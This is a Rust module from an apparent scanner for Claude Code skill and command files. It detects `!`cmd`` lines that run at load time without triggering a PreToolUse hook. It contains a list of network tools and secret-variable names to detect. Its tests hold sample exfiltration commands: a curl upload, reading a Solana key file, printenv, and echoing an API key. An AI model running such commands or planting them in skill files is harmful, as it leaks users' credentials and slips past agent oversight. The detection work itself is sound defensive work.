//! `` !`cmd` `` lines (spec D2.4): Claude Code runs them when the skill or command file loads,
//! and no PreToolUse Bash hook fires. Outside fences they are code (HIGH); with network or
//! secret access they feed the `bang_exfil` combo.

use super::context::{find_word, inline_spans, Document, Role};
use super::secrets_ctx::has_secret_path;
use super::{line_no, Ctx, FileOut, Severity, Signal};

/// Network tools that make a load-time command phone home.
const NETWORK: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "ftp", "telnet",
];
/// Variable-name fragments that mark a credential.
const SECRET_VARS: &[&str] = &[
    "key",
    "token",
    "secret",
    "password",
    "passwd",
    "credential",
    "mnemonic",
    "seed",
];

pub(super) fn scan(doc: &Document<'_>, out: &mut FileOut) {
    for i in 0..doc.len() {
        if doc.role(i) != Role::Prose {
            continue;
        }
        let line = doc.line(i);
        if !line.contains('`') || !line.contains("!`") {
            continue;
        }
        let spans = inline_spans(line);
        let mut from = 0;
        while let Some(p) = line
            .get(from..)
            .and_then(|r| r.find("!`"))
            .map(|p| p + from)
        {
            from = p + 2;
            if spans.iter().any(|&(s, e)| s <= p && p < e) {
                continue;
            }
            let Some(&(s, e)) = spans.iter().find(|&&(s, _)| s == p + 2) else {
                continue;
            };
            out.emit("bang_cmd", Severity::High, Some(line_no(i)), Ctx::Code);
            if exfil(&doc.lower_line(i)[s..e]) {
                out.signal(Signal::BangExfil(line_no(i)), Ctx::Code);
            }
        }
    }
}

/// Network or secret access in a load-time command.
fn exfil(cmd: &str) -> bool {
    let network = NETWORK.iter().any(|w| find_word(cmd, w).is_some())
        || cmd.contains("://")
        || cmd.contains("/dev/tcp");
    let env = find_word(cmd, "env").is_some() || find_word(cmd, "printenv").is_some();
    network || env || has_secret_path(cmd) || secret_var(cmd)
}

/// `$NAME` / `${NAME}` whose name marks a credential.
fn secret_var(cmd: &str) -> bool {
    cmd.match_indices('$').any(|(p, _)| {
        let name: String = cmd[p + 1..]
            .trim_start_matches('{')
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
            .collect();
        SECRET_VARS.iter().any(|k| name.contains(k))
    })
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{grade, Ctx, Grade, Severity};

    #[test]
    fn bang_outside_fence_is_code_high() {
        let r = scan_one("SKILL.md", "# S\n\nStatus: !`git status --short`\n");
        let f = hits(&r, "bang_cmd");
        assert_eq!(f.len(), 1, "{r:?}");
        assert_eq!(
            (f[0].sev, f[0].ctx, f[0].line),
            (Severity::High, Ctx::Code, Some(3))
        );
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn bang_with_network_or_secret_blocks() {
        for cmd in [
            "curl -s https://example.invalid/c -d @-",
            "cat ~/.config/solana/id.json",
            "printenv",
            "echo $ANTHROPIC_API_KEY",
        ] {
            let r = scan_one("commands/x.md", &format!("# X\n!`{cmd}`\n"));
            let c = combo(&r, "bang_exfil");
            assert!(c.is_some(), "{cmd}: {r:?}");
            assert_eq!(c.unwrap().line, Some(2));
        }
    }

    #[test]
    fn fenced_or_inline_examples_are_not_bang_commands() {
        let r = scan_one(
            "SKILL.md",
            "# S\n```md\n!`curl https://example.invalid`\n```\nWrite `!`ls`` to run it. Done! `npm test`\n",
        );
        assert!(!has(&r, "bang_cmd"), "{r:?}");
        assert!(r.combos.is_empty());
    }
}
